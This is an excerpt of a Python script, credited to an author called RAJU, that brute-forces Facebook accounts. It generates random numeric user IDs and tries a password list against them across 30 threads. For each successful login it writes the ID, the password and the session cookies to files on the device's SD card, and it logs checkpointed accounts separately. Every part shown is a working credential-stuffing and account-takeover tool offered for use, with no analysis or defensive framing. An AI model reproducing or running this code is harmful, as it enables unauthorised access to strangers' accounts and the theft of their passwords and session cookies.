...
\x1b[1;91m---------------------------------------
\x1b[1;97m> Author : RAJU
\x1b[1;97m> Github : https://github.com/Blacklove1122
\x1b[1;97m> Facebok: MD RAJU
...
def afg():
                ...
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as RAJU:     
                        clear()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in fadi:
                                ...
                                print('\r\r\033[1;32m [RAJU-OK] %s | %s'%(ids,pas))
                               # cek_apk(session,coki)
                                open('/sdcard/RAJU/RAJU-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RAJU/RAJU-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                ...
                                if 'y' in pcp:
                                        ...
                                        open('/sdcard/RAJU-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				#cek_apk(session,coki)
				open('/sdcard/RAJU/RAJU-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [FAHAD-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/RAJU/RAJU-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				uid = str(po['uid'])                                  
				print('\r\r\033[1;32m [RAJU-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
			#	print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				#cek_apk(session,coki)
				open('/sdcard/RAJU/RAJU-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
                                
				break
			elif 'www.facebook.com' in po['error']['message']:                                
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [RAJU-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/RAJU/RAJU-R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
    ...
    try:
        for ps in passlist:            
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [RAJU-OK] '+ids+' | '+ps)                
                #print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/RAJU/RAJU-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/RAJU-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				cookies = f"sb={ssbb};{ckkk}"
				#print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/RAJU/RAJU/FAHAD-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
